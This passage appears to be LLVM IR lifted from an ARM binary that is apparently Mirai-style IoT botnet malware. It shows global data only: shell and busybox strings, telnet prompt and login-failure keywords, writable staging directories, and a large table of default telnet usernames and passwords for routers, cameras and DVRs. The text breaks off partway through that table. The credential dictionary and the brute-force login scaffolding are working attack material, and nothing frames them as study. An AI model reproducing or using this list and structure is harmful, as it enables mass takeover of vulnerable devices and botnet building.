source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_26930.14 = global i32 0
@global_var_e770.18 = constant i32 -509558771
@global_var_272f0.21 = global i32 0
@global_var_272f4.22 = local_unnamed_addr global i32 0
@global_var_272f8.23 = local_unnamed_addr global i32 0
@global_var_2704c.26 = local_unnamed_addr global i32 4095
@global_var_27048.29 = global i32 362436
@global_var_1c7f0.31 = constant [7 x i8] c"(null)\00"
@global_var_2b2f0.33 = local_unnamed_addr global i32 0
@global_var_1c7f8.35 = constant [8 x i8] c"/bin/sh\00"
@global_var_1c800.37 = constant [3 x i8] c"sh\00"
@global_var_1c804.39 = constant [3 x i8] c"-c\00"
@global_var_1c808.42 = constant i32 -1
@global_var_272d0.45 = global i32 0
@global_var_1cc08.47 = constant [5 x i8] c"PING\00"
@global_var_1c7e0.49 = constant [8 x i8] c"busybox\00"
@global_var_1c7e8.50 = constant i32 36
@global_var_1c7ec.51 = constant i32 35
@global_var_2700c.52 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c7e0.49, i32 0, i32 0), i8* bitcast (i32* @global_var_1c7e8.50 to i8*), i8* bitcast (i32* @global_var_1c7ec.51 to i8*)]
@global_var_1c7a8.54 = constant [7 x i8] c"nvalid\00"
@global_var_1c7b0.55 = constant [6 x i8] c"ailed\00"
@global_var_1c7b8.56 = constant [9 x i8] c"ncorrect\00"
@global_var_1c7c4.57 = constant [6 x i8] c"enied\00"
@global_var_1c7cc.58 = constant [5 x i8] c"rror\00"
@global_var_1c7d4.59 = constant [7 x i8] c"oodbye\00"
@global_var_1c7dc.60 = constant [4 x i8] c"bad\00"
@global_var_26fec.61 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c7a8.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c7b0.55, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c7b8.56, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c7c4.57, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c7cc.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c7d4.59, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c7dc.60, i32 0, i32 0)]
@global_var_272d8.63 = global i32 0
@global_var_272dc.64 = local_unnamed_addr global i32 0
@global_var_2d540.66 = global i32 0
@global_var_1cc10.68 = constant [6 x i8] c":>%$#\00"
@global_var_1cc18.77 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_2d534.79 = global i32 0
@global_var_1c72c.81 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1c73c.82 = constant [6 x i8] c"/tmp/\00"
@global_var_1c744.83 = constant [6 x i8] c"/var/\00"
@global_var_1c74c.84 = constant [6 x i8] c"/dev/\00"
@global_var_1c754.85 = constant [10 x i8] c"/var/run/\00"
@global_var_1c760.86 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1c76c.87 = constant [6 x i8] c"/mnt/\00"
@global_var_1c774.88 = constant [7 x i8] c"/boot/\00"
@global_var_1c77c.89 = constant [6 x i8] c"/usr/\00"
@global_var_1c784.90 = constant [6 x i8] c"/opt/\00"
@global_var_26fac.91 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1c72c.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c73c.82, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c744.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c74c.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c754.85, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c760.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c76c.87, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c774.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c77c.89, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c784.90, i32 0, i32 0)]
@global_var_26fd8 = external global i32
@global_var_1bc14.98 = constant [7 x i8] c"telnet\00"
@global_var_1bc1c.99 = constant [5 x i8] c"root\00"
@global_var_1bc24.100 = constant [8 x i8] c"default\00"
@global_var_1bc30.101 = constant [7 x i8] c"daemon\00"
@global_var_1bc38.102 = constant [8 x i8] c"support\00"
@global_var_1bc44.103 = constant i32 0
@global_var_1bc48.104 = constant [7 x i8] c"123456\00"
@global_var_1bc50.105 = constant [7 x i8] c"Zte521\00"
@global_var_1bc58.106 = constant [6 x i8] c"vizxv\00"
@global_var_1bc60.107 = constant [8 x i8] c"support\00"
@global_var_1bc70.108 = constant [6 x i8] c"admin\00"
@global_var_1bc78.109 = constant [7 x i8] c"camera\00"
@global_var_1bc80.110 = constant [5 x i8] c"1234\00"
@global_var_1bc88.111 = constant [10 x i8] c"fliradmin\00"
@global_var_1bc94.112 = constant [4 x i8] c"jvc\00"
@global_var_1bc9c.113 = constant [8 x i8] c"meinsma\00"
@global_var_1bca8.114 = constant [9 x i8] c"password\00"
@global_var_1bcb4.115 = constant [11 x i8] c"supervisor\00"
@global_var_1bcc0.116 = constant [9 x i8] c"backdoor\00"
@global_var_1bccc.117 = constant [7 x i8] c"atc123\00"
@global_var_1bcd4.118 = constant [7 x i8] c"ascend\00"
@global_var_1bcdc.119 = constant [11 x i8] c"epicrouter\00"
@global_var_1bce8.120 = constant [5 x i8] c"none\00"
@global_var_1bcf0.121 = constant [9 x i8] c"1234User\00"
@global_var_1bcfc.122 = constant [12 x i8] c"5678Service\00"
@global_var_1bd0c.123 = constant [9 x i8] c"atlantis\00"
@global_var_1bd18.124 = constant [8 x i8] c"ROOT500\00"
@global_var_1bd24.125 = constant [7 x i8] c"xxyyzz\00"
@global_var_1bd2c.126 = constant [7 x i8] c"danger\00"
@global_var_1bd34.127 = constant [7 x i8] c"crftpw\00"
@global_var_1bd3c.128 = constant [7 x i8] c"cms500\00"
@global_var_1bd44.129 = constant [15 x i8] c"ggdaseuaimhrke\00"
@global_var_1bd54.130 = constant [8 x i8] c"tslinux\00"
@global_var_1bd60.131 = constant [5 x i8] c"pass\00"
@global_var_1bd68.132 = constant [7 x i8] c"NetICs\00"
@global_var_1bd70.133 = constant [9 x i8] c"security\00"
@global_var_1bd7c.134 = constant [7 x i8] c"friend\00"
@global_var_1bd84.135 = constant [8 x i8] c"manager\00"
@global_var_1bd90.136 = constant [7 x i8] c"bintec\00"
@global_var_1bd98.137 = constant [8 x i8] c"articon\00"
@global_var_1bda4.138 = constant [7 x i8] c"patrol\00"
@global_var_1bdac.139 = constant [8 x i8] c"service\00"
@global_var_1bdb8.140 = constant [5 x i8] c"tech\00"
@global_var_1bdc0.141 = constant [5 x i8] c"live\00"
@global_var_1bdc8.142 = constant [7 x i8] c"Master\00"
@global_var_1bdd0.143 = constant [7 x i8] c"laflaf\00"
@global_var_1bdd8.144 = constant [9 x i8] c"Helpdesk\00"
@global_var_1bde4.145 = constant [6 x i8] c"Super\00"
@global_var_1bdec.146 = constant [10 x i8] c"installer\00"
@global_var_1bdf8.147 = constant [9 x i8] c"fivranne\00"
@global_var_1be04.148 = constant [9 x i8] c"webadmin\00"
@global_var_1be10.149 = constant [9 x i8] c"Serv4EMC\00"
@global_var_1be1c.150 = constant [7 x i8] c"access\00"
@global_var_1be24.151 = constant [9 x i8] c"netadmin\00"
@global_var_1be30.152 = constant [9 x i8] c"mediator\00"
@global_var_1be3c.153 = constant [8 x i8] c"Mau'dib\00"
@global_var_1be48.154 = constant [7 x i8] c"cellit\00"
@global_var_1be50.155 = constant [8 x i8] c"diamond\00"
@global_var_1be5c.156 = constant [10 x i8] c"1234admin\00"
@global_var_1be68.157 = constant [9 x i8] c"changeme\00"
@global_var_1be74.158 = constant [7 x i8] c"attack\00"
@global_var_1be7c.159 = constant [7 x i8] c"cmaker\00"
@global_var_1be84.160 = constant [18 x i8] c"changeme2database\00"
@global_var_1be98.161 = constant [5 x i8] c"NULL\00"
@global_var_1bea0.162 = constant [6 x i8] c"Cisco\00"
@global_var_1bea8.163 = constant [6 x i8] c"cisco\00"
@global_var_1beb0.164 = constant [8 x i8] c"blender\00"
@global_var_1bebc.165 = constant [7 x i8] c"hsasdb\00"
@global_var_1bec4.166 = constant [7 x i8] c"wlsedb\00"
@global_var_1becc.167 = constant [13 x i8] c"wlsepassword\00"
@global_var_1bedc.168 = constant [7 x i8] c"system\00"
@global_var_1bee4.169 = constant [8 x i8] c"cgadmin\00"
@global_var_1bef0.170 = constant [5 x i8] c"surt\00"
@global_var_1bef8.171 = constant [5 x i8] c"tini\00"
@global_var_1bf00.172 = constant [5 x i8] c"any@\00"
@global_var_1bf08.173 = constant [6 x i8] c"davox\00"
@global_var_1bf10.174 = constant [7 x i8] c"calvin\00"
@global_var_1bf18.175 = constant [10 x i8] c"my_DEMARC\00"
@global_var_1bf24.176 = constant [8 x i8] c"MServer\00"
@global_var_1bf30.177 = constant [4 x i8] c"PBX\00"
@global_var_1bf38.178 = constant [8 x i8] c"NETWORK\00"
@global_var_1bf44.179 = constant [7 x i8] c"BRIDGE\00"
@global_var_1bf4c.180 = constant [14 x i8] c"michaelangelo\00"
@global_var_1bf5c.181 = constant [13 x i8] c"wrgg15_di524\00"
@global_var_1bf6c.182 = constant [9 x i8] c"firmware\00"
@global_var_1bf78.183 = constant [10 x i8] c"1234Admin\00"
@global_var_1bf84.184 = constant [11 x i8] c"software01\00"
@global_var_1bf90.185 = constant [15 x i8] c"Administration\00"
@global_var_1bfa0.186 = constant [8 x i8] c"su@psir\00"
@global_var_1bfac.187 = constant [8 x i8] c"4getme2\00"
@global_var_1bfb8.188 = constant [9 x i8] c"tiger123\00"
@global_var_1bfc4.189 = constant [5 x i8] c"help\00"
@global_var_1bfcc.190 = constant [10 x i8] c"extendnet\00"
@global_var_1bfd8.191 = constant [8 x i8] c"Exabyte\00"
@global_var_1bfe4.192 = constant [9 x i8] c"Posterie\00"
@global_var_1bff0.193 = constant [8 x i8] c"!manage\00"
@global_var_1bffc.194 = constant [7 x i8] c"radius\00"
@global_var_1c004.195 = constant [9 x i8] c"nimdaten\00"
@global_var_1c010.196 = constant [5 x i8] c"isee\00"
@global_var_1c018.197 = constant [11 x i8] c"56789Admin\00"
@global_var_1c024.198 = constant [11 x i8] c"specialist\00"
@global_var_1c030.199 = constant [7 x i8] c"public\00"
@global_var_1c038.200 = constant [7 x i8] c"secret\00"
@global_var_1c040.201 = constant [7 x i8] c"abc123\00"
@global_var_1c048.202 = constant [10 x i8] c"P@55w0rd!\00"
@global_var_1c054.203 = constant [8 x i8] c"iDirect\00"
@global_var_1c060.204 = constant [6 x i8] c"pilou\00"
@global_var_1c068.205 = constant [6 x i8] c"setup\00"
@global_var_1c070.206 = constant [6 x i8] c"hello\00"
@global_var_1c078.207 = constant [9 x i8] c"adslroot\00"
@global_var_1c084.208 = constant [14 x i8] c"administrator\00"
@global_var_1c094.209 = constant [14 x i8] c"Administrator\00"
@global_var_1c0a4.210 = constant [7 x i8] c"0Admin\00"
@global_var_1c0ac.211 = constant [9 x i8] c"123Admin\00"
@global_var_1c0b8.212 = constant [12 x i8] c"123456Admin\00"
@global_var_1c0c8.213 = constant [14 x i8] c"123456special\00"
@global_var_1c0d8.214 = constant [10 x i8] c"superuser\00"
@global_var_1c0e4.215 = constant [8 x i8] c"admin00\00"
@global_var_1c0f0.216 = constant [8 x i8] c"orion99\00"
@global_var_1c0fc.217 = constant [8 x i8] c"tivonpw\00"
@global_var_1c108.218 = constant [7 x i8] c"Ascend\00"
@global_var_1c110.219 = constant [6 x i8] c"super\00"
@global_var_1c118.220 = constant [12 x i8] c"lucenttech1\00"
@global_var_1c128.221 = constant [13 x i8] c"AitbISP4eCiG\00"
@global_var_1c138.222 = constant [6 x i8] c"smile\00"
@global_var_1c140.223 = constant [7 x i8] c"router\00"
@global_var_1c148.224 = constant [9 x i8] c"motorola\00"
@global_var_1c154.225 = constant [7 x i8] c"sysadm\00"
@global_var_1c15c.226 = constant [7 x i8] c"NetVCR\00"
@global_var_1c164.227 = constant [11 x i8] c"xdfk9874t3\00"
@global_var_1c170.228 = constant [5 x i8] c"4tas\00"
@global_var_1c178.229 = constant [6 x i8] c"maint\00"
@global_var_1c180.230 = constant [6 x i8] c"m1122\00"
@global_var_1c188.231 = constant [8 x i8] c"3ep5w2u\00"
@global_var_1c194.232 = constant [9 x i8] c"ntacdmax\00"
@global_var_1c1a0.233 = constant [9 x i8] c"PlsChgMe\00"
@global_var_1c1ac.234 = constant [8 x i8] c"private\00"
@global_var_1c1b8.235 = constant [14 x i8] c"smallbusiness\00"
@global_var_1c1c8.236 = constant [3 x i8] c"mu\00"
@global_var_1c1cc.237 = constant [14 x i8] c"microbusiness\00"
@global_var_1c1dc.238 = constant [8 x i8] c"pfsense\00"
@global_var_1c1e8.239 = constant [8 x i8] c"hawk201\00"
@global_var_1c1f4.240 = constant [8 x i8] c"h179350\00"
@global_var_1c200.241 = constant [3 x i8] c"lp\00"
@global_var_1c204.242 = constant [8 x i8] c"radware\00"
@global_var_1c210.243 = constant [9 x i8] c"trancell\00"
@global_var_1c21c.244 = constant [10 x i8] c"Col2ogro2\00"
@global_var_1c228.245 = constant [9 x i8] c"p1nacate\00"
@global_var_1c234.246 = constant [7 x i8] c"col1ma\00"
@global_var_1c23c.247 = constant [10 x i8] c"d1scovery\00"
@global_var_1c248.248 = constant [6 x i8] c"w2402\00"
@global_var_1c250.249 = constant [6 x i8] c"Sharp\00"
@global_var_1c258.250 = constant [9 x i8] c"engineer\00"
@global_var_1c264.251 = constant [8 x i8] c"ganteng\00"
@global_var_1c270.252 = constant [9 x i8] c"smcadmin\00"
@global_var_1c27c.253 = constant [10 x i8] c"barricade\00"
@global_var_1c288.254 = constant [10 x i8] c"highspeed\00"
@global_var_1c294.255 = constant [15 x i8] c"w0rkplac3rul3s\00"
@global_var_1c2a4.256 = constant [11 x i8] c"stratauser\00"
@global_var_1c2b0.257 = constant [6 x i8] c"Admin\00"
@global_var_1c2b8.258 = constant [8 x i8] c"mysweex\00"
@global_var_1c2c4.259 = constant [7 x i8] c"symbol\00"
@global_var_1c2cc.260 = constant [8 x i8] c"mercury\00"
@global_var_1c2d8.261 = constant [9 x i8] c"truetime\00"
@global_var_1c2e4.262 = constant [11 x i8] c"12345Admin\00"
@global_var_1c2f0.263 = constant [7 x i8] c"master\00"
@global_var_1c2f8.264 = constant [5 x i8] c"xbox\00"
@global_var_1c300.265 = constant [10 x i8] c"tellabs#1\00"
@global_var_1c30c.266 = constant [8 x i8] c"admin_1\00"
@global_var_1c318.267 = constant [7 x i8] c"talent\00"
@global_var_1c320.268 = constant [8 x i8] c"imss7.0\00"
@global_var_1c32c.269 = constant [8 x i8] c"detmond\00"
@global_var_1c338.270 = constant [10 x i8] c"1111Admin\00"
@global_var_1c344.271 = constant [11 x i8] c"22222Admin\00"
@global_var_1c350.272 = constant [8 x i8] c"x-admin\00"
@global_var_1c35c.273 = constant [7 x i8] c"switch\00"
@global_var_1c364.274 = constant [9 x i8] c"zoomadsl\00"
@global_var_1c370.275 = constant [9 x i8] c"expert03\00"
@global_var_1c37c.276 = constant [5 x i8] c"anko\00"
@global_var_1c384.277 = constant [11 x i8] c"oelinux123\00"
@global_var_1c390.278 = constant [7 x i8] c"alpine\00"
@global_var_1c398.279 = constant [8 x i8] c"maxided\00"
@global_var_1c3a4.280 = constant [10 x i8] c"raspberry\00"
@global_var_1c3b0.281 = constant [8 x i8] c"vagrant\00"
@global_var_1c3bc.282 = constant [6 x i8] c"zlxx.\00"
@global_var_1c3c4.283 = constant [9 x i8] c"juantech\00"
@global_var_1c3d0.284 = constant [7 x i8] c"avtech\00"
@global_var_1c3d8.285 = constant [7 x i8] c"xc3511\00"
@global_var_1c3e0.286 = constant [7 x i8] c"666666\00"
@global_var_1c3e8.287 = constant [7 x i8] c"888888\00"
@global_var_1c3f0.288 = constant [7 x i8] c"111111\00"
@global_var_1c3f8.289 = constant [9 x i8] c"bayandsl\00"
@global_var_1c404.290 = constant [12 x i8] c"12345676890\00"
@global_var_1c414.291 = constant [11 x i8] c"1234567890\00"
@global_var_1c420.292 = constant [13 x i8] c"admintelecom\00"
@global_var_1c430.293 = constant [13 x i8] c"telecomadmin\00"
@global_var_1c440.294 = constant [7 x i8] c"comcom\00"
@global_var_1c448.295 = constant [8 x i8] c"zte9x15\00"
@global_var_1c454.296 = constant [6 x i8] c"ZXDSL\00"
@global_var_1c45c.297 = constant [7 x i8] c"D-Link\00"
@global_var_1c464.298 = constant [6 x i8] c"dlink\00"
@global_var_1c46c.299 = constant [6 x i8] c"DLink\00"
@global_var_1c474.300 = constant [12 x i8] c"asteriskftp\00"
@global_var_1c484.301 = constant [9 x i8] c"dreambox\00"
@global_var_1c490.302 = constant [5 x i8] c"1111\00"
@global_var_1c498.303 = constant [6 x i8] c"12345\00"
@global_var_1c4a0.304 = constant [6 x i8] c"54321\00"
@global_var_1c4a8.305 = constant [7 x i8] c"fucker\00"
@global_var_1c4b0.306 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_1c4c0.307 = constant [13 x i8] c"7ujMko0vizxv\00"
@global_var_1c4d0.308 = constant [7 x i8] c"hi3518\00"
@global_var_1c4d8.309 = constant [7 x i8] c"klv123\00"
@global_var_1c4e0.310 = constant [8 x i8] c"klv1234\00"
@global_var_1c4ec.311 = constant [8 x i8] c"realtek\00"
@global_var_1c4f8.312 = constant [6 x i8] c"jvbzd\00"
@global_var_1c500.313 = constant [8 x i8] c"xmhdipc\00"
@global_var_1c50c.314 = constant [9 x i8] c"openlgtv\00"
@global_var_1c518.315 = constant [8 x i8] c"root123\00"
@global_var_1c524.316 = constant [9 x i8] c"ahetzip8\00"
@global_var_1c530.317 = constant [7 x i8] c"696969\00"
@global_var_1c538.318 = constant [9 x i8] c"pa55w0rd\00"
@global_var_1c544.319 = constant [7 x i8] c"123123\00"
@global_var_1c54c.320 = constant [9 x i8] c"b120root\00"
@global_var_1c558.321 = constant [9 x i8] c"PASSWORD\00"
@global_var_1c564.322 = constant [6 x i8] c"ADMIN\00"
@global_var_1c56c.323 = constant [8 x i8] c"netgear\00"
@global_var_1c578.324 = constant [7 x i8] c"vyatta\00"
@global_var_1c580.325 = constant [7 x i8] c"atc456\00"
@global_var_1c588.326 = constant [7 x i8] c"micros\00"
@global_var_1c590.327 = constant [8 x i8] c"comcast\00"
@global_var_1c59c.328 = constant [4 x i8] c"pos\00"
@global_var_1c5a4.329 = constant [4 x i8] c"www\00"
@global_var_1c5ac.330 = constant [5 x i8] c"2800\00"
@global_var_1c5b4.331 = constant [5 x i8] c"UBNT\00"
@global_var_1c5bc.332 = constant [9 x i8] c"00000000\00"
@global_var_1c5c8.333 = constant [5 x i8] c"user\00"
@global_var_1c5d0.334 = constant [5 x i8] c"ikwb\00"
@global_var_1c5d8.335 = constant [5 x i8] c"ubnt\00"
@global_var_1c5e0.336 = constant [4 x i8] c"buh\00"
@global_var_1c5e8.337 = constant [7 x i8] c"utstar\00"
@global_var_1c5f0.338 = constant [9 x i8] c"99999999\00"
@global_var_1c5fc.339 = constant [6 x i8] c"Meins\00"
@global_var_1c604.340 = constant [4 x i8] c"JVC\00"
@global_var_1c60c.341 = constant [5 x i8] c"ip20\00"
@global_var_1c614.342 = constant [7 x i8] c"ip3000\00"
@global_var_1c61c.343 = constant [6 x i8] c"ip400\00"
@global_var_1c624.344 = constant [8 x i8] c"tsunami\00"
@global_var_1c630.345 = constant [7 x i8] c"2601hx\00"
@global_var_1c638.346 = constant [7 x i8] c"synnet\00"
@global_var_1c640.347 = constant [6 x i8] c"quser\00"
@global_var_1c648.348 = constant [8 x i8] c"Manager\00"
@global_var_1c654.349 = constant [8 x i8] c"netopia\00"
@global_var_1c660.350 = constant [8 x i8] c"anicust\00"
@global_var_1c66c.351 = constant [10 x i8] c"d.e.b.u.g\00"
@global_var_1c678.352 = constant [5 x i8] c"echo\00"
@global_var_1c680.353 = constant [5 x i8] c"demo\00"
@global_var_1c688.354 = constant [7 x i8] c"client\00"
@global_var_1c690.355 = constant [6 x i8] c"CISCO\00"
@global_var_1c698.356 = constant [8 x i8] c"7654321\00"
@global_var_1c6a4.357 = constant [9 x i8] c"adsl1234\00"
@global_var_1c6b0.358 = constant [5 x i8] c"toor\00"
@global_var_1c6b8.359 = constant [9 x i8] c"adminttd\00"
@global_var_1c6c4.360 = constant [9 x i8] c"PlcmSpIp\00"
@global_var_1c6d0.361 = constant [9 x i8] c"11111111\00"
@global_var_1c6dc.362 = constant [9 x i8] c"22222222\00"
@global_var_1c6e8.363 = constant [9 x i8] c"mountsys\00"
@global_var_1c6f4.364 = constant [14 x i8] c"LSiuY7pOmZG2s\00"
@global_var_1c704.365 = constant [15 x i8] c"3UJUh2VemEfUte\00"
@global_var_1c714.366 = constant [11 x i8] c"Muse!Admin\00"
@global_var_1c720.367 = constant [10 x i8] c"changeme2\00"
@global_var_26a4c.368 = global [343 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bc14.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bc1c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bc1c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bc1c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bc1c.99, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bc1c.99, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bc24.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bc30.101, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bc38.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bc14.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bc1c.99, i32 0, i32 0), i8* bitcast (i32* @global_var_1bc44.103 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bc48.104, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bc50.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bc58.106, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bc24.100, i32 0, i32 0), i8* bitcast (i32* @global_var_1bc44.103 to i8*), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bc60.107, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bc70.108, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bc78.109, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bc80.110, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1bc88.111, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bc94.112, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bc9c.113, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bca8.114, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1bcb4.115, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bcc0.116, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bccc.117, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bca8.114, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bc70.108, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bcd4.118, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1bcdc.119, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bce8.120, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bcf0.121, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1bcfc.122, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bd0c.123, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bd18.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bd24.125, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bd2c.126, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bd34.127, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bd3c.128, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1bd44.129, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1bd44.129, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bd54.130, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bd60.131, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bd68.132, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bd70.133, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bd7c.134, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bd84.135, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bd90.136, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bd98.137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bda4.138, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bdac.139, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bdb8.140, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bdc0.141, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bdc8.142, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bdd0.143, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bdd8.144, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bde4.145, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1bdec.146, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bdf8.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1be04.148, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bca8.114, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1be10.149, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1be1c.150, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1be24.151, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1be30.152, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1be3c.153, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1be48.154, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1be50.155, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1be5c.156, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1be68.157, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1be74.158, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1be7c.159, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1be68.157, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1be84.160, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1be98.161, 